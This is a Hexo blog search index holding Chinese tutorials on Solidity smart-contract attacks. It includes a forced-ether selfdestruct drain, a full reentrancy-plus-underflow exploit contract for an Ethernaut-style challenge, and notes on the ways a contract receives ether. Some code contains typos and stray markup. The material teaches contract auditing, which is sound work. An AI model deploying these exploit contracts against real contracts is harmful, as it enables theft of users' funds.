<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>区块链骇客第二讲:被禁用的自毁函数</title>
    <link href="/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/"/>
    <url>/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-What？"><a href="#1-What？" class="headerlink" title="1. What？"></a>1. What？</h2><blockquote><p>在区块链中删除代码的<mark>唯一方法</mark>是该地址的合约执行自毁操作，即 <mark>selfdestruct</mark>()。</p><p>存储在该地址的剩余以太被发送到指定目标，然后从该状态中删除存储和代码。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Example&#123;<br>    constructor(address payable to) payable &#123;<br>        // redirect all the `msg.value` to `to` when selfdestructing<br>        selfdestruct(to);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>如上例所示，这是一个包含着<code>selfdestruct()</code>函数的简单合约。</p><p><code>constructor</code> 构造器，<code>payable</code>关键词使得该合约在被创建时就能够接收以太</p><p><code>selfdestruct()</code>自毁函数，合约在创建之时，就直接自毁，删除代码，并且将合约本身的余额<mark>强制</mark>发送到<code>to</code>这个地址上；</p><h3 id="说的简单点，自毁函数只有两个核心作用"><a href="#说的简单点，自毁函数只有两个核心作用" class="headerlink" title="说的简单点，自毁函数只有两个核心作用"></a>说的简单点，自毁函数只有两个核心作用</h3><ol><li>它使合约变为无效，有效地删除该地址的字节码。</li><li>它把合约的所有资金<mark>强制</mark>发送到目标地址。</li></ol><h2 id="2-Why？"><a href="#2-Why？" class="headerlink" title="2. Why？"></a>2. Why？</h2><blockquote><p>或许你对我上一部分举出的合约例子可能会感到疑惑，为什么不说得简洁一些呢？</p><p>那到底为什么要禁用自毁函数呢？</p><p>答案就在这个例子中！</p></blockquote><p><strong>这是一个具有攻击性的自毁合约；</strong></p><p>刚刚说到，当调用自毁函数之时，合约余额将会被强制发送指定的地址上。</p><p>注意<mark>强制</mark>这一个词，这意味着接收地址合约无论是否拥有接收以太的函数，它都无法拒绝这笔余额打进来。</p><p><strong>而这正是自毁函数被禁用的原因</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>//被攻击合约<br>contract Attacked &#123;<br>    //部署时传入0.08 ether<br>    constructor() payable &#123;&#125;<br><br>    //获取合约余额<br>    function getBalance() public view returns (uint256 balance) &#123;<br>        balance = address(this).balance;<br>        return balance;<br>    &#125;<br><br>    //提款函数<br>    function withdraw(uint256 amount) external &#123;<br>        require(address(this).balance &gt; 0.1 ether);<br>        require(amount &lt;= address(this).balance);<br>        payable(msg.sender).transfer(address(this).balance);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>如上例所示：这是一个被攻击的合约</strong></p><p>那么问题来了，如何使用上面所学知识，将合约中的<code>0.08 ether</code>装进自己的钱包？</p><h2 id="3-Try-！"><a href="#3-Try-！" class="headerlink" title="3. Try ！"></a>3. Try ！</h2><h3 id="让我们研究一下此合约"><a href="#让我们研究一下此合约" class="headerlink" title="让我们研究一下此合约"></a>让我们研究一下此合约</h3><ol><li>无<code>receive()</code>、以及任何实现<code>payable</code>的function，说明合约无法正常接收以太交易；</li><li><code>withdraw()</code>是外部函数，并且<mark>最关键的限制条件</mark>是使合约余额大于0.1 ether；</li></ol><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>只要我们能够有办法将0.021个甚至更少的ether打进该合约，让调用<code>withdraw()</code>函数满足条件，就可以成功赚到0.08个ether。</p><p>讲到这里，相信大家已经悟了，摩拳擦掌准备大展身手了！</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><ul><li>被攻击合约本身就有0.08 ether</li></ul><p><img src="/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/77BrotherBlog\source_posts\区块链骇客第二讲-被禁用的自毁函数\1.png"></p><ul><li>部署攻击合约，传入大于0.02个ether</li></ul><p><img src="/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/77BrotherBlog\source_posts\区块链骇客第二讲-被禁用的自毁函数\2.png"></p><ul><li>查看合约余额是否大于0.1 ether</li></ul><p><img src="/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/77BrotherBlog\source_posts\区块链骇客第二讲-被禁用的自毁函数\3.png"></p><ul><li>调用<code>withdraw()</code>函数提取合约所有余额，大功告成！</li></ul><p><img src="/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%8C%E8%AE%B2-%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0/77BrotherBlog\source_posts\区块链骇客第二讲-被禁用的自毁函数\4.png"></p><h2 id="更多区块链技术干货请关注"><a href="#更多区块链技术干货请关注" class="headerlink" title="更多区块链技术干货请关注"></a>更多区块链技术干货请关注</h2><p><a href="http://www.lanlianbbs.com/">岚链技术论坛</a></p><p><a href="https://nangbowan.github.io/">77Brother的技术小栈（个人博客）</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>区块链骇客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链骇客第一讲:重入攻击</title>
    <link href="/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%B8%80%E8%AE%B2-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <url>/2022/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%B8%80%E8%AE%B2-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章开启区块链骇客专栏的第一讲，让我决心开写本专栏的首要原因是对未来的职业选择有了一个确定的规划。</p><p>日后的更新频率将会不小于等于每周一讲，欢迎各位读者监督和指正，一起学习一同进步！</p></blockquote><h2 id="📕1-挑战"><a href="#📕1-挑战" class="headerlink" title="📕1. 挑战"></a>📕1. 挑战</h2><ul><li>这是<code>Ethernaut</code>中的一个例子（已修改）</li><li><strong>现在把需求交给你</strong>：使用<mark>重入攻击</mark>将以下合约中的资金全部取走。</li><li>你会先想到什么？什么是重入攻击？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol&quot;;<br><br>contract Reentrance &#123;<br>    using SafeMath for uint256;<br>    mapping(address =&gt; uint256) public balances;<br><br>    constructor() public payable &#123;&#125;<br><br>    function donate(address _to) public payable &#123;<br>        balances[_to] = balances[_to].add(msg.value);<br>    &#125;<br><br>    function balanceOf(address _who) public view returns (uint256 balance) &#123;<br>        return balances[_who];<br>    &#125;<br><br>    function withdraw(uint256 _amount) public &#123;<br>        if (balances[msg.sender] &gt;= _amount) &#123;<br>            (bool result, ) = address(msg.sender).call.value(_amount)(&quot;&quot;);<br>            if (result) &#123;<br>                _amount;<br>            &#125;<br>            balances[msg.sender] -= _amount;<br>        &#125;<br>    &#125;<br><br>    receive() external payable &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="📕2-思考"><a href="#📕2-思考" class="headerlink" title="📕2. 思考"></a>📕2. 思考</h2><blockquote><p>挑战先放在那，作为我们最后的一个实战练习。</p><p>先来看看重入攻击，到底是什么？</p></blockquote><h3 id="⭐重入原理：检查-生效-交互模式"><a href="#⭐重入原理：检查-生效-交互模式" class="headerlink" title="⭐重入原理：检查-生效-交互模式"></a>⭐重入原理：<a href="https://learnblockchain.cn/docs/solidity/security-considerations.html#checks-effects-interactions">检查-生效-交互模式</a></h3><blockquote><p>检查-生效-交互模式是solidity官方给出的该语言所遵循的机制</p><p>同时它也是重入攻击所利用的原理</p></blockquote><p><strong>用简练的语言概括这个模式</strong></p><ol><li>检查：检查函数是否能满足被正常调用的条件；</li><li>生效：处理合约状态变量修改；</li><li>交互：<mark>在这些事情完成之后，才能与外部合约做交互</mark>；</li></ol><p><strong>这就是一个合约函数从被调用到上链同步的流程；</strong></p><hr><p><strong>有同学不理解这个模式，那我举个例子描述</strong>：</p><ol><li>你去银行提款机取钱；</li><li>首先你得带卡吧，没卡取不了；除了带卡，你带的也得是本行的卡吧，带错了也取不了；带对卡了，你也得保证你卡里有钱吧，不然取啥钱；有钱也不一定管用，你还得保证你的卡是可用的….</li><li>当你满足了所有条件后，银行账户余额将会<mark>提前</mark>减少你取的数额，并将改变后的余额写进系统；此时提款机才吐钱，你的手上才多了这笔钱；</li><li><mark>在这些事情完成之后，你才能拿这笔钱去做其他事情</mark>；</li></ol><p><strong>这下懂了吧</strong>！</p><h3 id="🚀大胆猜想"><a href="#🚀大胆猜想" class="headerlink" title="🚀大胆猜想"></a>🚀大胆猜想</h3><blockquote><p>那既然合约基本都遵循这个原理，如何利用它？</p></blockquote><ol><li>可不可以趁合约修改状态还没闭环时，再修改它的状态？</li><li>想一想算法中的<mark>递归</mark>，设置一个条件，直到状态变量达到条件时递归才停止；</li><li>在合约中有没有这个条件存在，如何触发合约的递归呢？</li></ol><h2 id="📕3-实操Reentrance合约"><a href="#📕3-实操Reentrance合约" class="headerlink" title="📕3. 实操Reentrance合约"></a>📕3. 实操<code>Reentrance</code>合约</h2><blockquote><p>我们看上文留下的挑战</p></blockquote><p>⭐<strong>引入：</strong>SafeMath库，合约按理来说将不会发生溢出错误，除开没用到该库的地方；</p><p>⭐<strong>构造器：</strong>合约无构造器；</p><p>⭐<strong>函数：</strong></p><ol><li><code>donate</code>捐赠函数，可以向任意地址<code>_to</code>捐赠以太，<code>balances</code>哈希表记录数额；</li><li><code>balanceof</code>查看余额函数，返回地址<code>_who</code>记录的余额；</li><li><code>receive</code>接受以太函数；</li></ol><p>⭐<strong>问题函数：</strong></p><p><code>withdraw</code>提款函数，被捐赠地址可以通过此函数提取以太；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br><br>  receive() external payable &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>☠ <strong>这个函数有两个大问题</strong></p><ol><li>首先合约版本&lt;8.0，这就意味着除了用到safemath库以外的地方，都可能存在溢出漏洞；如 <code> balances[msg.sender] -= _amount;</code>它明明可以写成<code>balances[msg.sender].div(_amount);</code>调用safemath库的<code>div</code>方法来避免安全问题，但它就是写成了<code>-=_amount</code>; 不过这也正常，由于减少余额之前做了一个判断：<code>if(balances[msg.sender] &gt;= _amount)</code>，因此在正常情况下不可能发生漏洞；那么在不正常的情况下呢？</li><li><strong>更致命的问题</strong> 在于这个函数没有遵循 <a href="https://learnblockchain.cn/docs/solidity/security-considerations.html#checks-effects-interactions">检查-生效-交互模式</a>。形象来说，就是你马上要拿到这笔钱了，却跟银行说这钱不能够打到我的账上，于是又问银行要了这笔钱，这会给合约带来致命的问题（勿代入现实生活）</li></ol><p><strong>现在我们写一个合约来攻击<code>Reentrance</code>合约</strong></p><h3 id="AttackContract-sol"><a href="#AttackContract-sol" class="headerlink" title="AttackContract.sol"></a><code>AttackContract.sol</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs solidity">//SPDX-License-Identifier: Unlicense<br>pragma solidity &gt;=0.6.0;<br><br>import &#x27;./Reentrance.sol&#x27;;<br><br>contract AttackReentrance&#123;<br><br>  <br>   Reentrance private attackedContract;<br>   address private owner;<br>   uint256 private initialDonation;<br>   //重入锁指针<br>   bool private exploited;<br><br>   constructor(Reentrance _attacked) pubilc&#123;<br>       //传入被攻击合约地址<br>       attackedContract = _attacked;<br>       exploited = false;<br>       //初始化合约拥有者<br>       owner = msg.sender;<br>   &#125;<br><br>   //合约提款函数<br>   function withdraw() external&#123;<br>       uint256 balance = address(this).balance;<br>       (bool success,) = owner.call&#123;value: balance&#125;(&quot;&quot;);<br>       require(success,&quot;you are not owner of the contract!&quot;);<br>   &#125;<br><br><br>   function exploit() external payable&#123;<br>        require(msg.value &gt; 0, &quot;donate something!&quot;);<br>        initialDonation = msg.value;<br>        <br>       // 向被攻击合约捐赠 10 wei<br>       attackedContract.donate&#123;value: msg.value&#125;(address(this));        <br>        <br>        // 提取 传入数额<br>        attackedContract.withdraw(initialDonation);        <br>        <br>        // 由于被攻击合约会产生下溢漏洞因此它的余额在合约中将会无限放大<br>        // 现在就可以直接将被攻击合约余额全部提取<br>        attackedContract.withdraw(address(attackedContract).balance);<br>   &#125;<br><br>    //接收以太默认函数<br>    receive() external payable &#123;<br>        //加入重入锁，防止本合约被攻击<br>        if (!exploited) &#123;<br>            exploited = true;            <br>            <br>            //重入攻击关键！！在接受以太之时调用提款函数<br>            //造成状态叠加，破环（检查-生效-交互模式）<br>            attackedContract.withdraw(initialDonation);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="⭐解析攻击合约"><a href="#⭐解析攻击合约" class="headerlink" title="⭐解析攻击合约"></a>⭐解析攻击合约</h3><blockquote><p>此攻击合约巧妙利用了被攻击合约的两大漏洞！</p></blockquote><p>把焦点放到<code>exploit()</code>和<code>receive()</code>函数</p><ol><li>调用<code>exploit()</code>函数，传入10wei以太。</li><li>在<code>exploit()</code>函数中，首先调用被攻击合约的捐款函数，参数为被攻击合约；</li><li>然后调用被攻击合约的<code>donate</code>函数，参数为10wei;</li><li>调用被攻击合约的<code>withdraw()</code>函数，被攻击合约将在此时朝攻击合约发送10wei以太；</li><li><mark>最关键的一步：攻击合约receive()函数被动接收以太，但在函数中再一次地，调用了被攻击合约的withdraw()函数！</mark></li><li>至此被攻击合约<mark>陷入递归状态</mark>，将会不断地提款直至被攻击合约的余额发生下溢；</li><li>最后我们利用下溢错误，将被攻击合约余额全部提取至攻击合约；</li><li>接下来调用攻击合约的<code>withdraw()</code>函数将余额提取到自己的钱包。</li></ol><h2 id="📕4-总结"><a href="#📕4-总结" class="headerlink" title="📕4. 总结"></a>📕4. 总结</h2><p>在攻击过程中，我们破坏了<code>检查-生效-交互模式</code>，将合约的状态始终卡死在<code>balances[msg.sender] &gt;= _amount</code>状态，</p><p>使得<code>balances[msg.sender] -= _amount</code>余额不断减少，直至下溢漏洞的产生。一旦产生下溢，<code>balances[msg.sender]</code></p><p>将会变为无限大即2的256次方，此时提取合约全部余额，将会被合约视为理所当然！</p><h2 id="🚀更多区块链技术干货请关注"><a href="#🚀更多区块链技术干货请关注" class="headerlink" title="🚀更多区块链技术干货请关注"></a>🚀更多区块链技术干货请关注</h2><p><a href="https://nangbowan.github.io/">77Brother的技术小栈</a></p><p><a href="http://www.lanlianbbs.com/">岚链论坛 – 区块链技术的高质量社区</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>区块链骇客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计</tag>
      
      <tag>重入攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Solidity:接受以太的所有可能性</title>
    <link href="/2022/10/26/Solidity-%E6%8E%A5%E5%8F%97%E4%BB%A5%E5%A4%AA%E7%9A%84%E6%89%80%E6%9C%89%E5%8F%AF%E8%83%BD%E6%80%A7/"/>
    <url>/2022/10/26/Solidity-%E6%8E%A5%E5%8F%97%E4%BB%A5%E5%A4%AA%E7%9A%84%E6%89%80%E6%9C%89%E5%8F%AF%E8%83%BD%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<blockquote><p>目前来看，智能合约接受以太共有五种可能性；</p></blockquote><h2 id="1-receive"><a href="#1-receive" class="headerlink" title="1. receive()"></a>1. receive()</h2><p>一个合约最多有一个 <code>receive</code> 函数, 声明函数为： <code>receive() external payable &#123;&#125;</code></p><p>无需 <code>function</code> 关键字，也没有参数和返回值并且必须是<code>external</code>可见性和<code>payable</code> 修饰。 它可以是 <code>virtual</code> 的，可以被重载也可以有修改器modifier 。</p><p>在对合约没有<mark>任何附加数据调用</mark>（通常是对合约转账）是会执行 <code>receive</code> 函数。　</p><p>例如通过 <code>.send()</code> or <code>.transfer()</code> 如果 <code>receive</code> 函数不存在，但是有payable的 <a href="https://learnblockchain.cn/docs/solidity/contracts.html#fallback-function">fallback 回退函数</a> 那么在进行纯以太转账时，fallback 函数会被调用。</p><p>如果两个函数都没有，这个合约就没法通过常规的转账交易接收以太，会抛出异常。</p><p>并且，<code>receive</code> 函数只有 2300 gas 可以使用， 除了基础的日志输出之外，进行其他操作的余地很小。下面的操作消耗会操作 2300 gas :</p><ul><li>写入存储</li><li>创建合约</li><li>调用消耗大量 gas 的外部函数</li><li>发送以太币</li></ul><p><mark>不过</mark>，与任何其他函数一样，只要<mark>有足够的 gas 传递给它</mark>，回退函数就可以执行复杂的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>// 这个合约会保留所有发送给它的以太币，没有办法取回。<br>contract Sink &#123;<br>    event Received(address, uint);<br>    receive() external payable &#123;<br>        emit Received(msg.sender, msg.value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-实现payable的fallback"><a href="#2-实现payable的fallback" class="headerlink" title="2. 实现payable的fallback()"></a>2. 实现payable的fallback()</h2><p>合约可以最多有一个回退函数。函数声明为： <code>fallback() external [payable]</code> 或 <code>fallback() (bytes calldata input) external [payable] returns (bytes memory output)</code></p><p>没有<code>function</code>关键字。必须是<code>external</code>可见性，它可以是 <code>virtual</code> 的，可以被重载也可以有 修改器modifier 。</p><p>fallback　函数始终会接收数据，但为了同时接收以太时，必须标记为<code>payable</code> 。</p><p>如果使用了带参数的版本， <code>input</code> 将包含发送到合约的完整数据（等于 <code>msg.data</code> ），并且通过 <code>output</code> 返回数据。 返回数据不是 ABI 编码过的数据，相反，它返回不经过修改的数据。</p><p>如果回退函数在接收以太时调用，只有 2300 gas 可以使用。</p><p><mark>不过</mark>，与任何其他函数一样，只要<mark>有足够的 gas 传递给它</mark>，回退函数就可以执行复杂的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: GPL-3.0<br>pragma solidity &gt;=0.6.2 &lt;0.9.0;<br><br>contract Test &#123;<br>    // 发送到这个合约的所有消息都会调用此函数（因为该合约没有其它函数）。<br>    // 向这个合约发送以太币会导致异常，因为 fallback 函数没有 `payable` 修饰符<br>    fallback() external &#123; x = 1; &#125;<br>    uint x;<br>&#125;<br><br><br>// 这个合约会保留所有发送给它的以太币，没有办法返还。<br>contract TestPayable &#123;<br>    uint x;<br>    uint y;<br><br>    // 除了纯转账外，所有的调用都会调用这个函数．<br>    // (因为除了 receive 函数外，没有其他的函数).<br>    // 任何对合约非空calldata 调用会执行回退函数(即使是调用函数附加以太).<br>    fallback() external payable &#123; x = 1; y = msg.value; &#125;<br><br>    // 纯转账调用这个函数，例如对每个空empty calldata的调用<br>    receive() external payable &#123; x = 2; y = msg.value; &#125;<br>&#125;<br><br>contract Caller &#123;<br>    function callTest(Test test) public returns (bool) &#123;<br>        (bool success,) = address(test).call(abi.encodeWithSignature(&quot;nonExistingFunction()&quot;));<br>        require(success);<br>        //  test.x 结果变成 &lt;mark&gt; 1。<br><br>        // address(test) 不允许直接调用 ``send`` ,  因为 ``test`` 没有 payable 回退函数<br>        //  转化为 ``address payable`` 类型 , 然后才可以调用 ``send``<br>        address payable testPayable = payable(address(test));<br><br><br>        // 以下将不会编译，但如果有人向该合约发送以太币，交易将失败并拒绝以太币。<br>        // test.send(2 ether）;<br>    &#125;<br><br>    function callTestPayable(TestPayable test) public returns (bool) &#123;<br>        (bool success,) = address(test).call(abi.encodeWithSignature(&quot;nonExistingFunction()&quot;));<br>        require(success);<br>        // 结果 test.x 为 1  test.y 为 0.<br>        (success,) = address(test).call&#123;value: 1&#125;(abi.encodeWithSignature(&quot;nonExistingFunction()&quot;));<br>        require(success);<br>        // 结果test.x 为1 而 test.y 为 1.<br><br>        // 发送以太币, TestPayable 的 receive　函数被调用．<br><br>        // 因为函数有存储写入, 会比简单的使用 ``send`` or ``transfer``消耗更多的 gas。<br>        // 因此使用底层的call调用<br>        (success,) = address(test).call&#123;value: 2 ether&#125;(&quot;&quot;);<br>        require(success);<br><br>        // 结果 test.x 为 2 而 test.y 为 2 ether.<br><br>        return true;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注：实现payable的fallback-和receive-的区别"><a href="#注：实现payable的fallback-和receive-的区别" class="headerlink" title="注：实现payable的fallback() 和receive() 的区别"></a>注：实现payable的fallback() 和receive() 的区别</h3><ol><li>receive()优先接受<mark>纯以太</mark>的交易</li><li>实现payable的fallback()优先接受<mark>附带</mark>msg.data的交易</li></ol><h2 id="3-实现payable的函数"><a href="#3-实现payable的函数" class="headerlink" title="3. 实现payable的函数"></a>3. 实现payable的函数</h2><blockquote><p>这种方式无需多言，加个payable关键词就可以了！</p></blockquote><h2 id="4-selfdestruct"><a href="#4-selfdestruct" class="headerlink" title="4. selfdestruct()"></a>4. selfdestruct()</h2><blockquote><p>自毁函数是具有攻击性的一种让其它合约被迫接受以太的方式</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack&#123;<br><br> address private owner;<br><br> constructor()&#123;<br> owner = msg.sender;<br> &#125;<br> <br> event Received(address, uint);<br>    receive() external payable &#123;<br>        emit Received(msg.sender, msg.value);<br>  &#125;<br>  <br> //自毁转账<br> function selfdestructAttack(address _to) external public&#123;<br>     require(msg.sender &lt;mark&gt; this.owner,&quot;you are not the owner&quot;);<br>     selfdestruct(_to);<br> &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>如上例所示，当调用合约的<code>selfdestructAttack</code>函数时，此合约将会自毁，并且将合约内的余额强制发送到 _ to这个合约地址上，无论_ to合约是否实现接受以太的函数，都<mark>不得不接受</mark>这笔转账。</p><h2 id="5-miner区块奖励"><a href="#5-miner区块奖励" class="headerlink" title="5. miner区块奖励"></a>5. miner区块奖励</h2><blockquote><p>我们常说的挖矿奖励，当挖出了一个新区块时，以太奖励将会达到挖出人指定的地址上，无论这个地址是什么，它都会多出这笔奖励余额；</p><p>如今以太坊转型为PoS权益证明机制，miner区块奖励将会逐渐销声匿迹。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>合约安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>part2. UniSwap V2 | Swap Token</title>
    <link href="/2022/10/23/Part2.%20UniSwap%20V2%20%20Swap%20Tokens/"/>
    <url>/2022/10/23/Part2.%20UniSwap%20V2%20%20Swap%20Tokens/</url>
    
